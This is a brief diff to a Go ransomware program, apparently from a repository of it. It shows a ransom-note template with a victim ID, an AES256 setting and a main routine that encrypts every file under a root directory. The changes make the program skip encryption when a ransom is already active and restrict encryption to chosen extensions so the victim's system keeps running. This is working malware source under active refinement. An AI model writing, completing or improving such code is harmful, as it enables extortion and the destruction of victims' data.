@@ -28,6 +28,7 @@ Your unique ID is: %s
 `
 
 const serverPath = "http://localhost:8080"
+
 const encryptionScheme crypt.EncryptionScheme = crypt.AES256
 
 // If let empty, the program will attempt to encrypt all of the files. It is recommended to add some extensions:
@@ -79,7 +80,11 @@ func main() {
 
 	if err := rw.CheckIfActiveRansom(); err != nil {
 		handleDecryptionProcess(rw)
+		return
 	}
+
+	// Only encrypt certain files, that don't break the system
+	crypt.SetToEncrypt(extensionsToEncrypt)
 
 	if err := crypt.EncryptRootWithScheme(rw.RootDir, encryptionScheme, rw.MemguardKey); err != nil {
 		log.Fatalf("error while encrypting files, err: %s", err)
